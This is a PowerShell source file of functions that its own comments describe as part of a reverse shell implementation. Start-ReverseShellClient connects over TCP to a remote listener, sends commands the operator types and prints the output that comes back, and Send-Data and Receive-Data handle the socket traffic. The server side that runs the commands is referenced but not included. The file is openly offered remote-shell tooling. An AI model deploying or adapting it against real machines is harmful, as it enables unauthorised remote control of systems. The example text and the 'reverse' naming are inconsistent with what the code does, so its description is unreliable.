Function Send-Data {
    <#
    .SYNOPSIS
    Sends data to a remote client over a TCP connection.

    .DESCRIPTION
    This function sends the specified data to a remote client over a TCP connection established using a TcpClient object.

    .PARAMETER Client
    Mandatory - the TcpClient object representing the remote client to send data to.
    .PARAMETER Data
    Mandatory - the data to be sent to the remote client.

    .EXAMPLE
    Send-Data -Client $Client -Data "Hello, client!"

    .NOTES
    v0.0.1
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [System.Net.Sockets.TcpClient]$Client,

        [Parameter(Mandatory = $true)]
        [string]$Data
    )
    $Stream = $Client.GetStream()
    $Writer = [System.IO.StreamWriter]::new($Stream)
    $Writer.WriteLine($Data)
    $Writer.Flush()
}

Function Receive-Data {
    <#
    .SYNOPSIS
    Receives data from a remote client over a TCP connection.

    .DESCRIPTION
    This function reads and returns data received from a remote client over a TCP connection established using a TcpClient object.

    .PARAMETER Client
    Mandatory - TcpClient object representing the remote client from which data is to be received.

    .EXAMPLE
    $ReceivedData = Receive-Data -Client $Client

    .NOTES
    v0.0.1
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [System.Net.Sockets.TcpClient]$Client
    )
    $Stream = $Client.GetStream()
    $Reader = [System.IO.StreamReader]::new($Stream)
    return $Reader.ReadLine()
}

Function Start-ReverseShellClient {
    <#
    .SYNOPSIS
    Connects to a remote reverse shell server to execute PowerShell commands.

    .DESCRIPTION
    This function establishes a connection to a remote reverse shell server using the specified IP address and port number. Once connected, it allows the user to execute PowerShell commands on the remote server and receive the output.

    .PARAMETER IP
    Mandatory - the IP address or hostname of the remote reverse shell server to connect to.
    .PARAMETER Port
    Mandatory - port number on which the remote server is listening for incoming connections.

    .EXAMPLE
    Start-ReverseShellClient -IP "your_client_ip_or_host" -Port 12345
    This example connects to a reverse shell server running on IP address "192.168.1.100" and port 12345.

    .NOTES
    v0.0.1
    * use with function Start-ReverseShellServer.
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$IP,

        [Parameter(Mandatory = $true)]
        [int]$Port
    )
    Write-Host "ReverseShell - Asynchronous PowerShell Remote Shell (Client Mode)" -ForegroundColor Cyan
    Write-Host "--------------------------------------------------------------" -ForegroundColor Cyan
    try {
        $Client = [System.Net.Sockets.TcpClient]::new($IP, $Port)
        $Client.GetStream()
        $ClientIP = $Client.Client.LocalEndPoint.Address
        $ClientHost = [System.Net.Dns]::GetHostEntry($ClientIP).HostName
        Write-Host "[+] Connected to server at $ClientHost ($ClientIP)" -ForegroundColor Green
        do {
            $Command = Read-Host "ReverseShell> "
            if ($Command -eq "exit") {
                $Client.Close()
                Write-Host "[-] Connection closed."
                break
            }
            Send-Data -Client $Client -Data $Command
            $Output = Receive-Data -Client $Client
            Write-Host $Output

        } while ($Command -ne "exit")
    }
    catch {
        Write-Error -Message "Error connecting to the server: $($_.Exception.Message)"
    }
    finally {
        if ($null -ne $Client) {
            $Client.Close()
        }
    }
}
